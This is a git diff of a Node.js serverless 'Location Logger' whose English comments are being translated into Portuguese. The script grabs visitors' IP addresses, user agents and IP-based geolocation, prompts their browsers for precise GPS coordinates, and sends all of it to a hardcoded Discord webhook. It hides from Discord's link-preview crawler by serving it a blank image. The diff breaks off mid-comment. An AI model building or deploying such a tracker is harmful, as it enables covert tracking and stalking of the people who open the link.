@@ -1,9 +1,9 @@
-// Location Logger - Improved Version with Maps Integration
+// Location Logger - Versão corrigida para Vercel
 const https = require('https');
 const http = require('http');
 const url = require('url');
 
-// Configuration
+// Configuração
 const config = {
   "webhook": "https://discord.com/api/webhooks/1360077979798994975/fmGm-fubperOWmfIx7pO_OrVe1wZ5qpBbH35QjxJxequV3mjnfVmixC5wBtMRcfmxI1t",
   "username": "Location Tracker",
@@ -11,10 +11,10 @@ const config = {
   "accurateLocation": true
 };
 
-// Enhanced function to get detailed IP information
+// Função para obter informações detalhadas sobre o IP
 async function getIPInfo(ip) {
   return new Promise((resolve, reject) => {
-    // Using an alternative API that works better with IPv6 and mobile networks
+    // Usar API alternativa que funciona melhor com IPv6 e redes móveis
     const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
     
     http.get(apiUrl, (res) => {
@@ -26,42 +26,42 @@ async function getIPInfo(ip) {
       res.on('end', () => {
         try {
           const parsedData = JSON.parse(data);
-          console.log('IP API Response:', parsedData);
+          console.log('Resposta da API IP:', parsedData);
           
-          // Check if the API returned success
+          // Verificar se a API retornou sucesso
           if (parsedData.status === 'success') {
             resolve(parsedData);
           } else {
-            console.error('API returned non-success status:', parsedData);
-            // Still resolve with the data we have
+            console.error('API retornou status diferente de sucesso:', parsedData);
+            // Ainda resolvemos com os dados que temos
             resolve(parsedData);
           }
         } catch (e) {
-          console.error('Error parsing IP API response:', e);
-          console.error('Received data:', data);
-          // Resolve with an empty object to avoid formatting errors
+          console.error('Erro ao analisar resposta da API IP:', e);
+          console.error('Dados recebidos:', data);
+          // Resolvemos com um objeto vazio para evitar erros na formatação
           resolve({});
         }
       });
     }).on('error', (error) => {
-      console.error('Error requesting IP API:', error);
-      // Resolve with an empty object to avoid formatting errors
+      console.error('Erro ao fazer requisição para API de IP:', error);
+      // Resolvemos com um objeto vazio para evitar erros na formatação
       resolve({});
     });
   });
 }
 
-// Function to send webhook
+// Função para enviar webhook
 function sendDiscordWebhook(data) {
   return new Promise((resolve, reject) => {
     try {
-      // Prepare data
+      // Preparar os dados
       const webhookData = JSON.stringify(data);
       
-      // Parse webhook URL to get hostname and path
+      // Parsear a URL do webhook para obter hostname e path
       const webhookUrl = new URL(config.webhook);
       
-      // Configure request
+      // Configurar a requisição
       const options = {
         hostname: webhookUrl.hostname,
         path: webhookUrl.pathname + webhookUrl.search,
@@ -72,60 +72,60 @@ function sendDiscordWebhook(data) {
         }
       };
       
-      console.log('Sending to webhook:', options.hostname, options.path);
+      console.log('Enviando para webhook:', options.hostname, options.path);
       
-      // Create request
+      // Criar a requisição
       const req = https.request(options, (res) => {
         let responseData = '';
         
-        // Collect response data
+        // Coletar dados da resposta
         res.on('data', (chunk) => {
           responseData += chunk;
         });
         
-        // When response is complete
+        // Quando a resposta terminar
         res.on('end', () => {
-          // Check status code
+          // Verificar código de status
           if (res.statusCode >= 200 && res.statusCode < 300) {
-            console.log('Webhook sent successfully');
+            console.log('Webhook enviado com sucesso');
             resolve(true);
           } else {
-            console.error(`Error sending webhook: Status ${res.statusCode}`);
-            console.error(`Response: ${responseData}`);
+            console.error(`Erro ao enviar webhook: Status ${res.statusCode}`);
+            console.error(`Resposta: ${responseData}`);
             resolve(false);
           }
         });
       });
       
-      // Handle request errors
+      // Tratar erros na requisição
       req.on('error', (error) => {
-        console.error('Error in webhook request:', error);
-        reject(error);
+        console.error('Erro na requisição do webhook:', error);
+        resolve(false); // Mudado de reject para resolve para evitar crash
       });
       
-      // Send data
+      // Enviar os dados
       req.write(webhookData);
       req.end();
     } catch (error) {
-      console.error('Error sending webhook:', error);
-      reject(error);
+      console.error('Erro ao enviar webhook:', error);
+      resolve(false); // Mudado de reject para resolve para evitar crash
     }
   });
 }
 
-// Detect if device is iOS
+// Detectar se é um dispositivo iOS
 function isIOS(userAgent) {
   return /iPad|iPhone|iPod/.test(userAgent);
 }
 
-// Function to format complete Discord message with detailed IP info
+// Função para formatar a mensagem para o Discord
 function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
-  // Detect OS and browser
+  // Detectar sistema operacional e navegador
   let os = "Unknown";
   let browser = "Unknown";
   
   if (userAgent) {
-    // Operating system
+    // Sistema operacional
     if (userAgent.includes("Windows")) {
       os = "Windows";
     } else if (userAgent.includes("Mac OS")) {
@@ -138,7 +138,7 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
       os = "iOS";
     }
     
-    // Browser
+    // Navegador
     if (userAgent.includes("Firefox")) {
       browser = "Firefox";
     } else if (userAgent.includes("Chrome")) {
@@ -152,7 +152,7 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
     }
   }
 
-  // Format coordinates
+  // Formatar coordenadas
   let coordsText = 'Unknown';
   let coordsSource = 'Approximate';
   let mapsLink = '';
@@ -167,7 +167,7 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
     mapsLink = `https://www.google.com/maps/search/google+map++${info.lat},${info.lon}`;
   }
 
-  // Format timezone
+  // Formatar timezone
   let timezoneText = 'Unknown';
   if (info && info.timezone) {
     const parts = info.timezone.split('/');
@@ -178,7 +178,7 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
     }
   }
 
-  // Check if bot
+  // Verificar bot
   let botStatus = 'False';
   if (info && info.hosting) {
     botStatus = 'Possibly';
@@ -187,7 +187,7 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
     botStatus = 'Likely';
   }
 
-  // Extract ASN from "as" field
+  // Extrair ASN do campo "as"
   let asn = 'Unknown';
   if (info && info.as) {
     asn = info.as;
@@ -233,15 +233,15 @@ ${userAgent || 'Unknown'}
   };
 }
 
-// Main function
+// Função principal
 module.exports = async (req, res) => {
   try {
-    // Get URL parameters
+    // Obter parâmetros da URL
     const parsedUrl = url.parse(req.url, true);
     const params = parsedUrl.query;
-    const geoParam = params.g; // Check if we already have location coordinates
+    const geoParam = params.g; // Verificar se já temos coordenadas de localização
     
-    // Get IP and User Agent
+    // Obter IP e User Agent
     const ip = req.headers['x-forwarded-for'] || 
                req.headers['x-real-ip'] || 
                req.socket.remoteAddress || 
@@ -249,49 +249,36 @@ module.exports = async (req, res) => {
     
     const userAgent = req.headers['user-agent'] || 'Unknown';
     
-    console.log('Request received from IP:', ip);
+    console.log('Requisição recebida de IP:', ip);
     console.log('User Agent:', userAgent);
     
-    // Check if it's iOS for special handling
+    // Verificar se é iOS para tratamento especial
     const deviceIsIOS = isIOS(userAgent);
     
-    // Check if IP is from Discord (starts with 35)
-    const isDiscord = ip.startsWith('35');
+    // Verificar se o IP é do Discord (começa com 35)
+    const isDiscord = typeof ip === 'string' && ip.startsWith('35');
     
-    // If we have geolocation parameter, send to Discord
+    // Se temos parâmetro de geolocalização, enviar para o Discord
     if (geoParam) {
       try {
-        // Decode coordinates
+        // Decodificar as coordenadas
         const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
         const [latitude, longitude] = coords.split(',');
         
-        console.log('Coordinates received:', latitude, longitude);
+        console.log('Coordenadas recebidas:', latitude, longitude);
         
-        // Get detailed IP information
-        console.log('Getting IP information...');
+        // Obter informações detalhadas do IP
+        console.log('Obtendo informações do IP...');
         const ipInfo = await getIPInfo(ip);
-        console.log('IP information obtained:', ipInfo);
+        console.log('Informações do IP obtidas:', ipInfo);
         
-        // Format the complete message
-        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
+        // Formatar a mensagem completa
+        const data = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
         
-        // Send webhook to Discord with coordinates
-        const data = {
-          username: config.username,
-          content: "@everyone",
-          embeds: [
-            {
-              title: "Location Logger - Precise Location Captured",
-              color: config.color,
-              description: description
-            }
-          ]
-        };
-        
-        console.log('Sending webhook to Discord...');
+        console.log('Enviando webhook para o Discord...');
         await sendDiscordWebhook(data);
         
-        // Send page with the Google Maps view
+        // Enviar página com o Google Maps
         const html = `
           <!DOCTYPE html>
           <html>
@@ -365,12 +352,13 @@ module.exports = async (req, res) => {
         res.setHeader('Content-Type', 'text/html');
         res.status(200).send(html);
       } catch (error) {
-        console.error('Error processing geolocation:', error);
-        // Continue even with geolocation error
+        console.error('Erro ao processar geolocalização:', error);
+        // Continuar mesmo com erro na geolocalização
+        sendErrorPage(res);
       }
     } else if (isDiscord) {
-      // If it's Discord accessing, send link alert
-      console.log("Discord access detected. IP:", ip);
+      // Se for o Discord acessando, enviar alerta de link
+      console.log("Acesso do Discord detectado. IP:", ip);
       
       const data = {
         username: config.username,
@@ -386,24 +374,24 @@ module.exports = async (req, res) => {
       
       await sendDiscordWebhook(data);
       
-      // For Discord, send a blank response
-      res.setHeader('Content-Type', 'image/jpeg');
+      // Para o Discord, enviar imagem 1x1 transparente
+      res.setHeader('Content-Type', 'image/gif');
       res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
     } else if (config.accurateLocation) {
-      // If we don't have geolocation yet, request it from the browser
+      // Se não temos geolocalização ainda, solicitar do navegador
       
-      // First, get IP information and send basic report
-      console.log('Getting basic IP information...');
+      // Primeiro, obter informações do IP e enviar relatório básico
+      console.log('Obtendo informações básicas do IP...');
       const ipInfo = await getIPInfo(ip);
-      console.log('Basic IP information obtained:', ipInfo);
+      console.log('Informações básicas do IP obtidas:', ipInfo);
       
-      // Format the basic message
+      // Formatar a mensagem básica
       const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
       
-      console.log('Sending initial report to Discord...');
+      console.log('Enviando relatório inicial para o Discord...');
       await sendDiscordWebhook(data);
       
-      // Usando a mesma página para todos os dispositivos para forçar a solicitação de localização imediatamente
+      // Usando a mesma página para todos os dispositivos para forçar a solicitação de localização
       const html = `
         <!DOCTYPE html>
         <html>
@@ -733,213 +721,6 @@ module.exports = async (req, res) => {
               safariInst.style.display = 'none';
               firefoxInst.style.display = 'none';
               edgeInst.style.display = 'none';
+              genericInst.style.display = 'none';
               
-      
-      res.setHeader('Content-Type', 'text/html');
-      res.status(200).send(html);
-    } else {
-      // Geolocation not enabled, send basic report
-      console.log('Getting basic IP information (without geolocation)...');
-      const ipInfo = await getIPInfo(ip);
-      console.log('Basic IP information obtained:', ipInfo);
-      
-      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
-      
-      console.log('Sending report to Discord...');
-      await sendDiscordWebhook(data);
-      
-      // Send simple page with location request
-      const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Serviço de Localização</title>
-          <meta charset="utf-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <style>
-            body, html {
-              margin: 0;
-              padding: 0;
-              height: 100%;
-              width: 100%;
-              font-family: Arial, sans-serif;
-              background-color: #f5f5f5;
-            }
-            .container {
-              display: flex;
-              flex-direction: column;
-              align-items: center;
-              justify-content: center;
-              height: 100vh;
-              padding: 20px;
-              box-sizing: border-box;
-              text-align: center;
-            }
-            .location-box {
-              background-color: white;
-              border-radius: 8px;
-              padding: 30px;
-              max-width: 500px;
-              width: 100%;
-              box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            }
-            h1 {
-              color: #333;
-              margin-top: 0;
-              margin-bottom: 20px;
-            }
-            p {
-              color: #666;
-              line-height: 1.6;
-              margin-bottom: 25px;
-            }
-            .button {
-              background-color: #4285F4;
-              color: white;
-              border: none;
-              border-radius: 4px;
-              padding: 12px 24px;
-              font-size: 16px;
-              cursor: pointer;
-              transition: background-color 0.3s;
-            }
-            .button:hover {
-              background-color: #3367D6;
-            }
-            .location-icon {
-              display: block;
-              width: 80px;
-              height: 80px;
-              margin: 0 auto 20px;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="container">
-            <div class="location-box">
-              <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4285F4">
-                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-              </svg>
-              <h1>Serviço de Localização</h1>
-              <p>Para continuar, precisamos acessar sua localização atual. Isso nos permite mostrar informações relevantes com base na sua posição geográfica.</p>
-              <button id="getLocationBtn" class="button">Compartilhar minha localização</button>
-            </div>
-          </div>
-          
-          <script>
-            document.getElementById('getLocationBtn').addEventListener('click', function() {
-              if (navigator.geolocation) {
-                this.innerHTML = "Obtendo localização...";
-                this.disabled = true;
-                
-                navigator.geolocation.getCurrentPosition(
-                  function(position) {
-                    // Success - we have the position
-                    var lat = position.coords.latitude;
-                    var lng = position.coords.longitude;
-                    var coords = lat + "," + lng;
-                    
-                    // Encode in base64
-                    var encodedCoords = btoa(coords);
-                    
-                    // Build new URL
-                    var currentUrl = window.location.href;
-                    var newUrl;
-                    if (currentUrl.includes("?")) {
-                      newUrl = currentUrl + "&g=" + encodedCoords;
-                    } else {
-                      newUrl = currentUrl + "?g=" + encodedCoords;
-                    }
-                    
-                    // Redirect
-                    window.location.replace(newUrl);
-                  },
-                  function(error) {
-                    // Error getting location
-                    var button = document.getElementById('getLocationBtn');
-                    button.innerHTML = "Tentar novamente";
-                    button.disabled = false;
-                    
-                    alert("Erro ao acessar sua localização. Por favor, verifique as permissões do seu navegador e tente novamente.");
-                  },
-                  {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                  }
-                );
-              } else {
-                alert("Seu navegador não suporta serviços de geolocalização. Por favor, use um navegador mais recente.");
-              }
-            });
-          </script>
-        </body>
-        </html>
-      `;
-      
-      res.setHeader('Content-Type', 'text/html');
-      res.status(200).send(html);
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    
-    // In case of error, send a basic page
-    res.setHeader('Content-Type', 'text/html');
-    res.status(200).send(`
-      <!DOCTYPE html>
-      <html>
-      <head>
-        <title>Serviço de Localização</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-          body, html {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            text-align: center;
-            padding: 20px;
-          }
-          .error-container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 500px;
-          }
-          h1 {
-            color: #d32f2f;
-            margin-top: 0;
-          }
-          p {
-            color: #666;
-            line-height: 1.6;
-          }
-          button {
-            background-color: #4285F4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 12px 24px;
-            margin-top: 20px;
-            font-size: 16px;
-            cursor: pointer;
-          }
-        </style>
-      </head>
-      <body>
-        <div class="error-container">
-          <h1>Erro no serviço</h1>
-          <p>Houve um problema ao carregar o serviço de localização. Por favor, tente novamente mais tarde.</p>
-          <button onclick="window.location.reload()">Tentar novamente</button>
-        </div>
-      </body>
-      </html>
-    `);
-  }
-};
+              // Mo
